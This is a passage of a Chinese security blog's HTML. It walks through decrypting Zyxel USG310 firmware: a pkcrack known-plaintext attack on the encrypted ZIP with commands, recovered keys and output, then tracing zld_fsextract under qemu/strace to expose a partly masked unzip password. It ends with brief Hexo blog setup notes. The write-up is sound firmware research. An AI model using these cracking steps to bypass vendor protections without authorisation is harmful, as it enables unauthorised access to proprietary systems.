tree, size: 12032 bytes, version: 17</span><br><span class="line">7085520       0x6C1DD0        ASCII cpio archive (SVR4 with no CRC), file name: &quot;.&quot;, file name length: &quot;0x00000002&quot;, file size: &quot;0x00000000&quot;</span><br><span class="line">7085632       0x6C1E40        ASCII cpio archive (SVR4 with no CRC), file name: &quot;init&quot;, file name length: &quot;0x00000005&quot;, file size: &quot;0x0000000D&quot;</span><br><span class="line">7085764       0x6C1EC4        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit&quot;, file name length: &quot;0x00000007&quot;, file size: &quot;0x00000000&quot;</span><br><span class="line">7085884       0x6C1F3C        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/zld_fsextract&quot;, file name length: &quot;0x00000015&quot;, file size: &quot;0x00017098&quot;</span><br><span class="line">7180376       0x6D9058        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/etc_inittab&quot;, file name length: &quot;0x00000013&quot;, file size: &quot;0x00000BB8&quot;</span><br><span class="line">7183508       0x6D9C94        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/rw.zip&quot;, file name length: &quot;0x0000000E&quot;, file size: &quot;0x001330BD&quot;</span><br><span class="line">8441296       0x80CDD0        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/zyinit_gpl&quot;, file name length: &quot;0x00000012&quot;, file size: &quot;0x00055128&quot;</span><br><span class="line">8789880       0x861F78        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/sw_cn60xx.ko&quot;, file name length: &quot;0x00000014&quot;, file size: &quot;0x000073E0&quot;</span><br><span class="line">8819676       0x8693DC        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/e2fsck&quot;, file name length: &quot;0x0000000E&quot;, file size: &quot;0x0006B64C&quot;</span><br><span class="line">9259684       0x8D4AA4        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/zld_udev&quot;, file name length: &quot;0x00000010&quot;, file size: &quot;0x0008B460&quot;</span><br><span class="line">9830276       0x95FF84        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/zld_mrd.ko&quot;, file name length: &quot;0x00000012&quot;, file size: &quot;0x000016D0&quot;</span><br><span class="line">9836244       0x9616D4        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/lkm.lst&quot;, file name length: &quot;0x0000000F&quot;, file size: &quot;0x00000050&quot;</span><br><span class="line">9836452       0x9617A4        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/db.zip&quot;, file name length: &quot;0x0000000E&quot;, file size: &quot;0x00003829&quot;</span><br><span class="line">9850956       0x96504C        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/mke2fs&quot;, file name length: &quot;0x0000000E&quot;, file size: &quot;0x0004239C&quot;</span><br><span class="line">10122340      0x9A7464        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/unzip&quot;, file name length: &quot;0x0000000D&quot;, file size: &quot;0x0002B8B0&quot;</span><br><span class="line">10300816      0x9D2D90        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/platform_support.ko&quot;, file name length: &quot;0x0000001B&quot;, file size: &quot;0x000048C0&quot;</span><br><span class="line">10319580      0x9D76DC        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/switchdev_char.ko&quot;, file name length: &quot;0x00000019&quot;, file size: &quot;0x00004DE8&quot;</span><br><span class="line">10339660      0x9DC54C        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/switchdev.ko&quot;, file name length: &quot;0x00000014&quot;, file size: &quot;0x00009A90&quot;</span><br><span class="line">10379360      0x9E6060        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/fwversion&quot;, file name length: &quot;0x00000011&quot;, file size: &quot;0x00000158&quot;</span><br><span class="line">10379832      0x9E6238        ASCII cpio archive (SVR4 with no CRC), file name: &quot;zyinit/zyinit&quot;, file name length: &quot;0x0000000E&quot;, file size: &quot;0x000C0AEC&quot;</span><br><span class="line">11169184      0xAA6DA0        ASCII cpio archive (SVR4 with no CRC), file name: &quot;TRAILER!!!&quot;, file name length: &quot;0x0000000B&quot;, file size: &quot;0x00000000&quot;</span><br></pre></td></tr></table></figure>
+
+<p>解开240 如下的文件目录包含一下内容，我看到了db.zip。 这让我联想到了 “firmware_USG310_4.70_2\470AAPJ0C0.bin\db\etc\zyxel\ftp\conf&quot; 目录中的system-defalut.conf  文件</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220530231109223-1654092354501.png" alt="image-20220530231109223"></p>
+<p>于是使用unzip解开db.zip 文件，很幸运，这个zip 并没有同 470AAPJ0C0.bin  一样被加密。</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531095654808-1654092377775.png" alt="image-20220531095654808"></p>
+<p>可以看到里面有一个 system-default.conf  文件，可以看到这个文件的大小和名称和前面看到的一样大。我认为这个文件和”firmware_USG310_4.70_2\470AAPJ0C0.bin\db\etc\zyxel\ftp\conf&quot; 目录中的system-defalut.conf  文件是同一个文件。这样我又可以使用 pkcrack 进行破解了。</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531095902454-1654092377775.png" alt="image-20220531095902454"></p>
+<p>在使用pkcrack 明文攻击进行破解之前，简单的描述一下pkcrack 的攻击原理。</p>
+<h2 id="0x03-pkcrack-明文攻击"><a href="#0x03-pkcrack-明文攻击" class="headerlink" title="0x03 pkcrack 明文攻击"></a>0x03 pkcrack 明文攻击</h2><p>明文攻击<br>该攻击是已知的纯文本攻击，这意味着您必须知道部分加密数据才能破解密码。<br>比如：加密压缩包中有10张图片，其中1张图片你有未加密的源文件。<br>常用工具: ARCHPR 4.53、pkcrack<br>原理：明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件<br>速度：非常快</p>
+<blockquote>
+<p>pkcark 进行明文破解<br>使用pkcrack进行明文破解需要注意一点：压缩包中可能包含多个加密文件，但我们只要持有其中一个文件即可，该文件必须和压缩包中的某个文件一模一样。在破解前，需要先把明文文件进行压缩。如果使用zip命令直接压缩可能会出现压缩率的问题。windows下可以使用7-zip一类的桌面应用进行压缩。使用7-zip进行压缩时，会有一个压缩率的选项，可以调整word size的大小，如果这个压缩率和加密文件的压缩率不匹配，破解时可能会出现文件长度不匹配问题<br>查看压缩率可以借助 zipdetails、360压缩、7zip等查看。<br><a target="_blank" rel="noopener" href="https://github.com/keyunluo/pkcrack">https://github.com/keyunluo/pkcrack</a></p>
+</blockquote>
+<p>pkcrack 破解需要两个文件</p>
+<ul>
+<li>需要解密的ZIP文件</li>
+<li>另一个zip文件，其中至少包含未加密的加密存档红的一个文件。必须使用与加密文件相同的压缩方法压缩该文件。</li>
+</ul>
+<blockquote>
+<p>pkcrack -C encrypted-ZIP -c ciphertextname -P plaintext-ZIP -p plaintextname -d decrypted_file -a</p>
+</blockquote>
+<p>encrypted-ZIP：是加密的ZIP归档文件的名称（和路径）<br>ciphertextname：是存档中文件的名称，对于该文件，您具有-纯文本<br>plaintext-ZIP：是包含压缩明文的ZIP归档文件的名称（和路径）<br>plaintextname：是归档文件中包含已知明文的文件名<br>unlocked_file：是解密档案将被写入的文件的名称</p>
+<p><strong>示例</strong></p>
+<blockquote>
+<p>demo<br>├── demo.zip # encrypted-ZIP<br>├── pkcrack<br>├── pkcrack.exe<br>├── README.txt # plaintext<br>└── README.zip # plaintext-ZIP</p>
+</blockquote>
+<p>用shell 命令用于破解</p>
+<blockquote>
+<p>..&#x2F;bin&#x2F;pkcrack -C demo.zip -c README.txt -P README.zip -p README.txt -d cracked.zip -a</p>
+</blockquote>
+<h2 id="0x04-固件解包2"><a href="#0x04-固件解包2" class="headerlink" title="0x04 固件解包2"></a>0x04 固件解包2</h2><p>使用pkcrack 解开固件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/i/g/z/firmware_USG310_4.70&gt; </span><br><span class="line">zip -9 470AAPJ0C0.zip system-default.conf </span><br><span class="line">  adding: system-default.conf (deflated 84%)</span><br><span class="line">tigerortiger@ubuntu ~/i/g/z/firmware_USG310_4.70&gt; </span><br><span class="line">/home/tigerortiger/tools/pkcrack/bin/pkcrack -C 470AAPJ0C0.bin -c db/etc/zyxel/ftp/conf/system-default.conf -P 470AAPJ0C0.zip -p system-default.conf -d cracked.zip -a</span><br><span class="line">Generating 1st generation of possible key2_11532 values...done.</span><br><span class="line">Found 4194304 possible key2-values.</span><br><span class="line">Now we&#x27;re trying to reduce these...</span><br><span class="line">Lowest number: 989 values at offset 6926</span><br><span class="line">Lowest number: 954 values at offset 6924</span><br><span class="line">Lowest number: 898 values at offset 5324</span><br><span class="line">Done. Left with 898 possible Values. bestOffset is 5324.</span><br><span class="line">Stage 1 completed. Starting stage 2 on </span><br><span class="line">Ta-daaaaa! key0=184108c9, key1=a102a710, key2=8f550772</span><br><span class="line">Probabilistic test succeeded for 6213 bytes.</span><br><span class="line">Ta-daaaaa! key0=184108c9, key1=a102a710, key2=8f550772</span><br><span class="line">Probabilistic test succeeded for 6213 bytes.</span><br><span class="line">Stage 2 completed. Starting zipdecrypt on</span><br><span class="line">Decrypting compress.img (624a9fbe5fcf76c1bdf8eb86)... OK!</span><br><span class="line">Decrypting db/ (863c636d34664e0e43c3858b)... OK!</span><br><span class="line">Decrypting db/etc/ (9438acbd8959952d160c858b)... OK!</span><br><span class="line">Decrypting db/etc/zyxel/ (51b87c5ec94917155458858b)... OK!</span><br><span class="line">Decrypting db/etc/zyxel/ftp/ (b28c0fca7cc7f78ffa8e858b)... OK!</span><br><span class="line">Decrypting db/etc/zyxel/ftp/conf/ (2525dc17bac05f9a4da7858b)... OK!</span><br><span class="line">Decrypting db/etc/zyxel/ftp/conf/system-default.conf (c4c22bea727241c6f6816779)... OK!</span><br><span class="line">...</span><br><span class="line">Decrypting etc_writable/zyxel/conf/__system_default_device_ha.xml (c83a53734113602259af6779)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/conf/__system_default_dynamic_guest_log.xml (2061195d4ef1dfcb2b2d6779)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/conf/__wantrunk_default.xml (d06c63f2a332c4dc718dc085)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/conf/__zwo.xml (5d594289e3ff7f8d5bebcf86)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/conf/dynamic_guest_log.xml (f66649f9e313ccd24136868b)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/coredump_script/ (ae137544f7ad54f9eebd868b)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/coredump_script/common.sh (dfcc6000cb3ca1609dec1786)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/coredump_script/samples.sh (5fb2e2a1cae7bbddfe761786)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/coredump_script/sdwan_common.sh (5160662af82248b81a751786)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/printer/ (76acf8b17a486b36cfbb868b)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/printer/SP350E.dat (d8b9df979471623787e18e81)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/printer/double_print.sh (9f01ea1939359e15be448e81)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/secuextender/ (0e53686443987b96c859868b)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/secuextender/applet.html (9df9661a81cfa97ff5ba2e82)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/secuextender/sslapp.jar (f407182e1b0743d27b67a982)... OK!</span><br><span class="line">Decrypting etc_writable/zyxel/selector/ (296a84395ffc890845b1437f)... OK!</span><br><span class="line">Decrypting filechecksum (b48c0dec79379e4cac83898b)... OK!</span><br><span class="line">Decrypting filelist (878dcff5a799dfe9ef6c8a8b)... OK!</span><br><span class="line">Decrypting fwversion (e223b319d7586e29573e848b)... OK!</span><br><span class="line">Decrypting kernelchecksum (8d701dd63dd56aa385810987)... OK!</span><br><span class="line">Decrypting kernelshare1100.bin (0ef2d6fb1ee26b107de40987)... OK!</span><br><span class="line">Decrypting wtp_image/ (2423c9bb7b21b8c347cb898b)... OK!</span><br><span class="line">Decrypting wtp_image/cloud_checksum (5dd7bf2962fa3637a954898b)... OK!</span><br><span class="line">Decrypting wtp_image/nwa5123-ac (3d4ca00fc39c85554711878b)... OK!</span><br><span class="line">Decrypting wtp_image/nwa5123-ac-hd (fb86ad6cc45e1e0a12e9888b)... OK!</span><br><span class="line">Decrypting wtp_image/wtpinfo (298480fe98ba3898b2b3888b)... OK!</span><br><span class="line">Decrypting wtpinfo (9deeef6c027ef4bd1420888b)... OK</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功解开zip 文件。其实为什么470AAJ0C0.conf 文件不能爆破，我解开之后，大概的看了一下system-default.conf文件，这两个文件的内容是大概是一模一样的，没仔细找，那多出的一个字节是啥。</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531100827634-1654092501169.png" alt="image-20220531100827634"></p>
+<h2 id="0x05-提取文件系统"><a href="#0x05-提取文件系统" class="headerlink" title="0x05 提取文件系统"></a>0x05 提取文件系统</h2><p>查看compress.img 的文件格式，可以看到这是Squashfs </p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220601213159701-1654092512813.png" alt="image-20220601213159701"></p>
+<p>解开之后整个文件目录结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">├── _470AAPJ0C0.ri.extracted</span><br><span class="line">│   └── _240.extracted</span><br><span class="line">│       ├── cpio-root</span><br><span class="line">│       └── etc</span><br><span class="line">├── _compress.img.extracted</span><br><span class="line">│   └── squashfs-root</span><br><span class="line">│       ├── bin</span><br><span class="line">│       ├── dev</span><br><span class="line">│       ├── etc</span><br><span class="line">│       ├── lib</span><br><span class="line">│       ├── lib32 -&gt; lib/</span><br><span class="line">│       ├── lib64</span><br><span class="line">│       ├── sbin</span><br><span class="line">│       ├── usr</span><br><span class="line">│       ├── util</span><br><span class="line">│       └── var</span><br><span class="line">├── db</span><br><span class="line">│   └── etc</span><br><span class="line">│       └── zyxel</span><br><span class="line">├── etc_writable</span><br><span class="line">│   ├── budget</span><br><span class="line">│   ├── ModemManager</span><br><span class="line">│   ├── usb_modeswitch</span><br><span class="line">│   └── zyxel</span><br><span class="line">│       ├── conf</span><br><span class="line">│       ├── coredump_script</span><br><span class="line">│       ├── printer</span><br><span class="line">│       ├── secuextender</span><br><span class="line">│       └── selector</span><br><span class="line">└── wtp_image</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-zld-fsextract-解开固件"><a href="#0x06-zld-fsextract-解开固件" class="headerlink" title="0x06 zld_fsextract 解开固件"></a>0x06 zld_fsextract 解开固件</h2><p>关于 zld_fsextract 的讲解，原文讲的很详细了，这里就复现一下</p>
+<p><a target="_blank" rel="noopener" href="https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/">https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/i/g/z/f/_470AAPJ0C0.ri.extracted [1]&gt; chmod -R 777  ./_240.extracted/</span><br><span class="line">tigerortiger@ubuntu ~/i/g/z/f/_/_240.extracted&gt; file zld_fsextract </span><br><span class="line">zld_fsextract: ELF 32-bit MSB executable, MIPS, N32 MIPS64 rel2 version 1 (SYSV), statically linked, stripped</span><br><span class="line">tigerortiger@ubuntu ~/i/g/z/f/_/_240.extracted&gt; which qemu-mipsn32-static </span><br><span class="line">/usr/bin/qemu-mipsn32-static</span><br><span class="line">tigerortiger@ubuntu ~/i/g/z/f/_/_240.extracted&gt; cp /usr/bin/qemu-mipsn32-static  ./</span><br><span class="line">tigerortiger@ubuntu ~/i/g/z/f/_/_240.extracted&gt; chmod 777 qemu-mipsn32-static </span><br><span class="line">tigerortiger@ubuntu ~/i/g/z/f/_/_240.extracted&gt; </span><br><span class="line">sudo strace -f -s 199 qemu-mipsn32-static ./zld_fsextract ../../470AAPJ0C0.bin  ./unzip -s extract -e code</span><br><span class="line">[sudo] password for tigerortiger: </span><br><span class="line">execve(&quot;/usr/bin/qemu-mipsn32-static&quot;, [&quot;qemu-mipsn32-static&quot;, &quot;./zld_fsextract&quot;, &quot;../../470AAPJ0C0.bin&quot;, &quot;./unzip&quot;, &quot;-s&quot;, &quot;extract&quot;, &quot;-e&quot;, &quot;code&quot;], 0x7fffa6cc8d20 /* 17 vars */) = 0</span><br><span class="line">brk(NULL)                               = 0x62813000</span><br><span class="line">brk(0x62814280)                         = 0x62814280</span><br><span class="line">arch_prctl(ARCH_SET_FS, 0x62813940)     = 0</span><br><span class="line">uname(&#123;sysname=&quot;Linux&quot;, nodename=&quot;ubuntu&quot;, ...&#125;) = 0</span><br><span class="line">set_tid_address(0x62813c10)             = 64399</span><br><span class="line">set_robust_list(0x62813c20, 24)         = 0</span><br><span class="line">rt_sigaction(SIGRTMIN, &#123;sa_handler=0x6014ccc0, sa_mask=[], s</span><br><span class="line">...</span><br><span class="line">[pid  3040] wait4(-1, strace: Process 3048 attached</span><br><span class="line"> &lt;unfinished ...&gt;</span><br><span class="line">[pid  3048] set_robust_list(0x64384c20, 24) = 0</span><br><span class="line">[pid  3048] rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], ~[KILL STOP RTMIN RT_1], 8) = 0</span><br><span class="line">[pid  3048] clone(child_stack=0x7fd85d2dcdb0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0x7fd85d2dd9d0, tls=0x7fd85d2dd700, child_tidptr=0x7fd85d2dd9d0) = 3049</span><br><span class="line">[pid  3048] rt_sigprocmask(SIG_SETMASK, ~[KILL STOP RTMIN RT_1], NULL, 8) = 0</span><br><span class="line">[pid  3048] rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], NULL, 8) = 0</span><br><span class="line">[pid  3048] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0</span><br><span class="line">[pid  3048] execve(&quot;./unzip&quot;, [&quot;./unzip&quot;, &quot;-o&quot;, &quot;-q&quot;, &quot;-P&quot;, &quot;RvP5AXXXXXXXXXXXXXXXXXXXXXXXXXXXXXFmhjdq.rqDqX.cPD9BG3eq/Y&quot;, &quot;../../470AAPJ0C0.bin&quot;, &quot;-d&quot;, &quot;/&quot;, &quot;db/etc/zyxel/ftp/conf/&quot;, &quot;db/etc/zyxel/ftp/conf/system-default.conf&quot;], 0x643d4b50 /* 16 vars */strace: Process 3049 attached</span><br><span class="line"> &lt;unfinished ...&gt;</span><br><span class="line">[pid  3049] +++ exited with 0 +++</span><br><span class="line">[pid  3048] &lt;... execve resumed&gt; )      = 0</span><br><span class="line">[pid  3048] brk(NULL)                   = 0x64372000</span><br><span class="line">[pid  3048] brk(0x64373280)             = 0x64373280</span><br><span class="line">[pid  3048] arch_prctl(ARCH_SET_FS, 0x64372940) = 0</span><br><span class="line">[pid  3048] uname(&#123;sysname=&quot;Linux&quot;, nodename=&quot;ubuntu&quot;, ...&#125;) = 0</span><br><span class="line">[pid  3048] set_tid_address(0x64372c10) = 3048</span><br><span class="line">[pid  3048] set_robust_list(0x64372c20, 24) = 0</span><br><span class="line">[pid  3048] rt_sigaction(SIGRTMIN, &#123;sa_handler=0x60142520, sa_mask=[], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x6014a9b0&#125;, NULL, 8) = 0</span><br><span class="line">[pid  3048] rt_sigaction(SIGRT_1, &#123;sa_handler=0x601425c0, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART|SA_SIGINFO, sa_restorer=0x6014a9b0&#125;, NULL, 8) = 0</span><br><span class="line">[pid  3048] rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0</span><br><span class="line">[pid  3048] prlimit64(0, RLIMIT_STACK, NULL, &#123;rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY&#125;) = 0</span><br><span class="line">[pid  3048] readlink(&quot;/proc/self/exe&quot;, &quot;/usr/bin/qemu-mips-static&quot;, 4096) = 25</span><br><span class="line">[pid  3048] brk(0x64394280)             = 0x64394280</span><br></pre></td></tr></table></figure>
+
+<p>主要是查看这一句,密钥有一部分我就不公布了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[pid  3048] execve(&quot;./unzip&quot;, [&quot;./unzip&quot;, &quot;-o&quot;, &quot;-q&quot;, &quot;-P&quot;, &quot;RvP5AXXXXXXXXXXXXXXXXXXXXXXXXXXXXXFmhjdq.rqDqX.cPD9BG3eq/Y&quot;, &quot;../../470AAPJ0C0.bin&quot;, &quot;-d&quot;, &quot;/&quot;, &quot;db/etc/zyxel/ftp/conf/&quot;, &quot;db/etc/zyxel/ftp/conf/system-default.conf&quot;], </span><br></pre></td></tr></table></figure>
+
+<p>最终用整个密钥也可以解开470AAPJ0C0.bin</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220601214513234.png" alt="image-20220601214513234"></p>
+<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>这个固件解密的方式主要用的方式pkcrack，利用的就是一个未加密的conf文件，进行解密，总的来说，在分析加密固件的时候，应该对那些伴随加密固件一起发布出来的其他文件进行详细的信息收集，以便了解更多与固件相关的信息，另外，加密固件在更新到设备上的时候，是需要解密后提取文件系统才能使用的，如果设备上原本是没有密钥或者生成密钥的算法，那么解密的密钥或者解密的方式大概率会和加密固件一起发布出来。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tig3rhu.github.io/2023/12/15/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/" data-id="clq9l1r3y000aysvbghp201qo" data-title="USG310_4.70_固件解密分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-55__搭建个人博客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/15/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" class="article-date">
+  <time class="dt-published" datetime="2023-12-15T09:58:11.506Z" itemprop="datePublished">2023-12-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/15/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">github 博客搭建记录</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="安装npm"><a href="#安装npm" class="headerlink" title="安装npm"></a>安装npm</h3><p>下载nodejs<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215142420966.png"></p>
+<p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215142511277.png"></p>
+<h3 id="下载Hexo"><a href="#下载Hexo" class="headerlink" title="下载Hexo"></a>下载Hexo</h3><p>安装命令：npm install hexo -g<br>ps： 下载会失败，更改镜像为淘宝的npm镜像站。<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215145400750.png"><br>安装成功<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215145459306.png"></p>
+<h3 id="安装hexo-依赖"><a href="#安装hexo-依赖" class="headerlink" title="安装hexo 依赖"></a>安装hexo 依赖</h3><p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215145617081.png"></p>
+<h3 id="把ssh-key-的-pub-公钥"><a href="#把ssh-key-的-pub-公钥" class="headerlink" title="把ssh key 的 pub 公钥"></a>把ssh key 的 pub 公钥</h3><p>把ssh key 的 pub 公钥 发送到github中<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215145905798.png"><br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215180007355.png"></p>
+<p>验证ssh 是否能连接成功<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215150534676.png"></p>
+<h3 id="hexo-init-初始化"><a href="#hexo-init-初始化" class="headerlink" title="hexo init 初始化"></a>hexo init 初始化</h3><p>hexo init 初始化，可能会报permitted<br>解决方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/c327127960/article/details/116997142">https://blog.csdn.net/c327127960/article/details/116997142</a><br>修改1_blog 文件夹的user权限。</p>
+<p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215151951928.png"></p>
+<p>生成静态网页<br>hexo g<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215152110309.png"></p>
+<p>预览<br>hexo s<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215152319329.png"></p>
